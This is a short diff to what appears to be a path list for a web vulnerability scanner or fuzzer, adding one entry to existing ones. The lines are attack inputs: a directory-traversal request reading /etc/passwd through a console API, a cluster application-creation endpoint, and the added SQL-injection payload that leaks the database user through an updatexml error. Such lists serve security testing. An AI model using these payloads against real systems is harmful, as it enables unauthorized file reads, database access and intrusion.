@@ -3,3 +3,4 @@
 /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
 /run
 /ws/v1/cluster/apps/new-application
+/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
